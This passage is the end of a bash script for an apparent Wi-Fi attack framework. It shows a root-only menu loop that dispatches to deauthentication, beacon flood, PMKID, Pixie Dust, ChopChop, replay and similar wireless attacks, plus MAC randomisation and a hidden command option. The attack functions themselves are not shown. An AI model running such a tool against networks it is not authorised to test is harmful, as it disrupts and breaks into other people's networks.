echo -e " @@  @@  @@   @@   @@@   @@   @@  @@  @@  "
echo -e " @   @@  @@  @@   @@@@@   @@  @@  @@   @  "
echo -e " @@  @@  @@   @@   @@@   @@   @@  @@  @@  "
echo -e " @@   @@  @@@               @@@  @@   @@  "
echo -e "  @@   @@.        /   \\        .@@   @@  "
echo -e "    @@           /     \\           @@    "
echo -e "                /       \\		   "
echo -e "               /         \\               "
echo -e "              /           \\              "
echo -e "             /             \\             "
echo -e "            /               \\${endColour}"
}

# Main Function
if [ "$(id -u)" == "0" ]; then

	while getopts ":i:" arg; do
		case $arg in
			i) netCard=$OPTARG;
		esac
	done

	if [ "$netCard" ]; then

		while true; do
			clear
			tput civis
			all_banners
			sleep 0.09
			export PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/snap/bin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
			dir=$(pwd)
			dependencies
			sleep 0.09
			active_card
			sleep 0.09
			card_status
			mac_status
			sleep 0.09
			echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] List of the availables functions:${endColour}"
			sleep 0.09
			echo -e "\n${blueColour}[${endColour}${yellowColour}1${endColour}${blueColour}] Beacon Flood Attack${endColour}\t\t\t${blueColour}[${endColour}${yellowColour}10${endColour}${blueColour}] Pixie Dust Attack${endColour}"
			sleep 0.09
			echo -e "${blueColour}[${endColour}${yellowColour}2${endColour}${blueColour}] Deauthentication Attack${endColour}\t\t${blueColour}[${endColour}${yellowColour}11${endColour}${blueColour}] Caffe-Latte Attack${endColour}"
			sleep 0.09
			echo -e "${blueColour}[${endColour}${yellowColour}3${endColour}${blueColour}] Authentication Attack${endColour}\t\t${blueColour}[${endColour}${yellowColour}12${endColour}${blueColour}] ChopChop Attack${endColour}"
			sleep 0.09
			echo -e "${blueColour}[${endColour}${yellowColour}4${endColour}${blueColour}] PKMID Attack${endColour}\t\t\t${blueColour}[${endColour}${yellowColour}13${endColour}${blueColour}] Michael Exploitation Attack${endColour}"
			sleep 0.09
			echo -e "${blueColour}[${endColour}${yellowColour}5${endColour}${blueColour}] Pasive Attack${endColour}\t\t\t${blueColour}[${endColour}${yellowColour}14${endColour}${blueColour}] Replay Attack${endColour}"
			sleep 0.09
			echo -e "${blueColour}[${endColour}${yellowColour}6${endColour}${blueColour}] Randomize MAC address${endColour}"
			sleep 0.09
			echo -e "${blueColour}[${endColour}${yellowColour}7${endColour}${blueColour}] Start network card${endColour}"
			sleep 0.09
			echo -e "${blueColour}[${endColour}${yellowColour}8${endColour}${blueColour}] Stop network card${endColour}"
			sleep 0.09
			echo -e "${blueColour}[${endColour}${yellowColour}9${endColour}${blueColour}] Attacks info${endColour}"
			sleep 0.09
			echo -ne "\n${blueColour}[${endColour}${yellowColour}WEF${endColour}${blueColour}] Choose an option -->${endColour} " && read option

			if [ "$option" == "1" ] || [ "$option" == "beacon" ] || [ "$option" == "beacon flood" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
				type_of_attack="Beacon Flood Attack"
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					beacon_attack
				else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
					echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before doing any attack press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "2" ] || [ "$option" == "deauth" ] || [ "$option" == "deauthentication" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
				type_of_attack="Deauthentication Attack"
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					deauth_attack
				else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
					echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before doing any attack press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "3" ] || [ "$option" == "auth" ] || [ "$option" == "authentication" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
                                type_of_attack="Authentication Attack"
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					auth_attack
				else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
					echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before doing any attack press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "4" ] || [ "$option" == "pkmid" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
				type_of_attack="PKMID Attack"
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					pkmid_attack
				else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
					echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before doing any attack press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "5" ] || [ "$option" == "passive" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
				type_of_attack="Passive/Stealthy Attack"
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					pasive_attack
				else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
					echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before doing any attack press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "6" ] || [ "$option" == "randomize" ] || [ "$option" == "mac" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ":")
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Randomizing your MAC address...${endColour}"
                               		sleep 0.3
					mac_randomizer
                                	sleep 2.5
				else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
                                        echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before randomizing your MAC, press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "7" ] || [ "$option" == "start" ]; then
                                sleep 0.15
				card_setup
			fi

			if [ "$option" == "8" ] || [ "$option" == "stop" ]; then
				sleep 0.15
                                card_stop
                        fi

			if [ "$option" == "9" ] || [ "$option" == "help" ] || [ "$option" == "info" ] || [ "$option" == "attacks" ]; then
				sleep 0.1
				clear
				all_banners
				sleep 0.1
				functions_info
				sleep 1
				keep_exit
			fi

			if [ "$option" == "10" ] || [ "$option" == "pixie" ] || [ "$option" == "pixie dust" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
				type_of_attack="Pixie Dust Attack"
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					pixie_dust
				else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
					echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before doing any attack press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "11" ] || [ "$option" == "caffe" ] || [ "$option" == "caffe latte" ] || [ "$option" == "caffe-latte" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
				type_of_attack="Caffe Latte Attack"
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					caffe-latte
			else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
					echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before doing any attack press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "12" ] || [ "$option" == "chopchop" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
				type_of_attack="ChopChop Attack"
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					chopchop
				else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
					echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before doing any attack press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "13" ] || [ "$option" == "michael" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
				type_of_attack="Michael Shutdown Exploitation Attack"
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					michael
				else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
					echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before doing any attack press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "14" ] || [ "$option" == "replay" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
				if [ "$mon_check" == "${netCard}mon" ]; then
					sleep 0.15
					replay
				else
					echo -e "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Your card is not in monitor mode.${endColour}"
					echo -e "${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Please before doing any attack press the ${endColour}${yellowColour}Start network card${endColour}${blueColour} option${endColour}"
					sleep 2.5
					keep_exit
				fi
			fi

			if [ "$option" == "15" ]; then
				sleep 0.15
				mon_check=$(ifconfig | grep "$netCard" | awk '{print $1}' | tr -d ':')
				sleep 0.15
				image_changer
			fi

			if [ "$option" == "exec" ]; then
				sleep 0.15
				exec_commands
			fi

			if [ "$option" == "exit" ]; then
				ctrl_c
			fi

			if [ "$option" == "quit" ]; then
				ctrl_c
			fi

			if [ "$option" == "WEF" ] || [ "$option" == "wef" ] || [ "$option" == "99" ]; then
				secret
				sleep 3
			fi
		done
	else
		helpPanel
	fi
else
	echo -e "${yellowColour} __      _____ ___ "
	echo -e " \ \    / / __| __|"
	echo -e "  \ \/\/ /| _|| _| "
	echo -e "   \_/\_/ |___|_|  ${endColour}"
	echo -e "\n${blueColour}[${endColour}${yellowColour}X${endColour}${blueColour}] Please, execute the program as root${endColour}\n"
	exit 1
fi
